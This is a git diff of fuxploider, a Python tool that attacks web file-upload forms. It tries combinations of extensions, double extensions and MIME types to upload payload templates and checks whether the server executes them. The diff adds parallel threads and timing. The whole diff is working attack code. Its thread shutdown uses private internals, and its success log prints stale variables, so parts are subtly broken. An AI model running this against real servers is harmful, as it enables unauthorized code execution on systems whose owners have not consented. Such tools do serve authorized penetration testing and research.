@@ -1,7 +1,8 @@
 #!/usr/bin/python3
-import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json
+import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json,concurrent.futures
 from utils import *
 from UploadForm import UploadForm
+from threading import Lock
 #signal.signal(signal.SIGINT, quitting)
 version = "0.3.1"
 logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
@@ -46,9 +47,11 @@ exclusiveVerbosityArgs.add_argument("-vvv",action="store_true",required=False,de
 
 parser.add_argument("-s","--skip-recon",action="store_true",required=False,dest="skipRecon",help="Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.")
 parser.add_argument("-y",action="store_true",required=False,dest="detectAllEntryPoints",help="Force detection of every entry points without asking to continue each time one is found.")
+parser.add_argument("-T","--threads",metavar="Threads",nargs=1,dest="nbThreads",help="Number of parallel tasks (threads).",type=int,default=[4])
 
 args = parser.parse_args()
 args.uploadsPath = args.uploadsPath[0]
+args.nbThreads = args.nbThreads[0]
 
 if args.template :
 	args.template = args.template[0]
@@ -173,6 +176,7 @@ if args.proxy :
 
 up = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath)
 up.setup(args.url)
+up.threads = args.nbThreads
 #########################################################
 
 ############################################################
@@ -180,6 +184,9 @@ uploadURL = up.uploadUrl
 fileInput = {"name":up.inputName}
 
 ###### VALID EXTENSIONS DETECTION FOR THIS FORM ######
+
+a = datetime.datetime.now()
+
 if not args.skipRecon :
 	if len(args.legitExtensions) > 0 :
 		n = up.detectValidExtensions(extensions,args.n,args.legitExtensions)
@@ -194,68 +201,85 @@ if up.validExtensions == [] :
 	logger.error("No valid extension found.")
 	exit()
 
-entryPoints = []
-with open("techniques.json","r") as rawTechniques :
-	techniques = json.loads(rawTechniques.read())
+b = datetime.datetime.now()
+print("Extensions detection : "+str(b-a))
+
 
 ##############################################################################################################################################
 ##############################################################################################################################################
 input("Start uploading payloads ?")
-logger.info("### Starting code execution detection (messing with file extensions and mime types...)")
-wantToStop = False
-for template in templates :
-	if wantToStop :
-		break
-	logger.debug("Template in use : %s",template)
+entryPoints = []
 
+with open("techniques.json","r") as rawTechniques :
+	techniques = json.loads(rawTechniques.read())
+logger.info("### Starting code execution detection (messing with file extensions and mime types...)")
+c = datetime.datetime.now()
+nbOfEntryPointsFound = 0
+attempts = []
+templatesData = {}
+
+for template in templates :
 	templatefd = open(templatesFolder+"/"+template["filename"],"rb")
+	templatesData[template["templateName"]] = templatefd.read()
+	templatefd.close()
 	nastyExt = template["nastyExt"]
 	nastyMime = getMime(extensions,nastyExt)
 	nastyExtVariants = template["extVariants"]
-
-	attempts = []
-
-	nbOfValidExtensions = len(up.validExtensions)
-	nbOfEntryPointsFound = 0
-	i = 0
-	while not wantToStop and i < nbOfValidExtensions :
-		legitExt = up.validExtensions[i]
+	for legitExt in up.validExtensions :
 		legitMime = getMime(extensions,legitExt)
-		#exec all known techniques
-		##	for each variant of the code execution trigerring extension (php,asp etc)
-		### using either bad or good mime type
-		listOfExtensionsTmp = [nastyExt]+nastyExtVariants
-		listOfExtensions = listOfExtensionsTmp
-
-		for nastyVariant in listOfExtensions :
+		for nastyVariant in [nastyExt]+nastyExtVariants :
 			for t in techniques :
 				mime = legitMime if t["mime"] == "legit" else nastyMime
 				suffix = t["suffix"].replace("$legitExt$",legitExt).replace("$nastyExt$",nastyVariant)
-				attempts.append({"suffix":suffix,"mime":mime})
+				attempts.append({"suffix":suffix,"mime":mime,"templateName":template["templateName"]})
 
-		try :
-			for a in attempts :
-				suffix = a["suffix"]
-				mime = a["mime"]
 
-				res = up.submitTestCase(suffix,mime,templatefd.read(),template["codeExecRegex"])
-				templatefd.seek(0)
+
+stopThreads = False
+lock = Lock()
+attemptsTested = 0
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=args.nbThreads) as executor :
+	futures = []
+	try :
+		for a in attempts :
+			suffix = a["suffix"]
+			mime = a["mime"]
+			payload = templatesData[a["templateName"]]
+			codeExecRegex = [t["codeExecRegex"] for t in templates if t["templateName"] == a["templateName"]][0]
+
+			f = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)
+			futures.append(f)
+
+		for future in concurrent.futures.as_completed(futures) :
+			res = future.result()
+			attemptsTested += 1
+			if not stopThreads :
 				if res["codeExec"] :
+					lock.acquire()
 					logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",suffix,mime,template["filename"])
 					nbOfEntryPointsFound += 1
 					foundEntryPoint = a
-					foundEntryPoint["template"] = template["filename"]
 					entryPoints.append(foundEntryPoint)
-					if not args.detectAllEntryPoints :
-						cont = input("Continue attacking ? [y/N] : ")
-						if not cont.lower().startswith("y") :
-							wantToStop = True
-							break
-		except KeyboardInterrupt :
-			wantToStop = True
-		i += 1
-	templatefd.close()
+					lock.release()
+					raise KeyboardInterrupt
+
+	except KeyboardInterrupt :
+		stopThreads = True
+		executor._threads.clear()
+		concurrent.futures.thread._threads_queues.clear()
+		executor.shutdown(wait=False)
+
+
+
+
+################################################################################################################################################
+################################################################################################################################################
+lock.acquire()
+d = datetime.datetime.now()
+print("Code exec detection : "+str(d-c))
 print()
 logging.info("%s entry point(s) found using %s HTTP requests.",nbOfEntryPointsFound,up.httpRequests)
 print("Found the following entry points : ")
 print(entryPoints)
+lock.release()
